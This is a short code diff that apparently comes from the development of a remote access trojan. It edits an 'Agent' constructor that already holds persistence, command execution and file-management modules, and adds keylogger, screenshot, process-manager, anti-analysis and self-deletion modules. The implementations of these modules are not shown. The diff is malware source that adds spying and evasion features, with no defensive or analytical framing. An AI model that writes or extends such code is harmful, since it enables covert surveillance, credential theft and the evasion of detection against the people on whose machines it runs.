@@ -13,6 +13,11 @@ Agent::Agent(Config config) : config_(std::move(config)) {
     persistence_manager_ = std::make_unique<system::PersistenceManager>(config_.app_name);
     command_executor_ = std::make_unique<modules::CommandExecutor>();
     file_manager_ = std::make_unique<modules::FileManager>();
+    keylogger_ = std::make_unique<modules::Keylogger>();
+    screenshot_ = std::make_unique<modules::Screenshot>();
+    process_manager_ = std::make_unique<modules::ProcessManager>();
+    anti_analysis_ = std::make_unique<modules::AntiAnalysis>();
+    self_deletion_ = std::make_unique<modules::SelfDeletion>();
 }
 
 Agent::~Agent() {
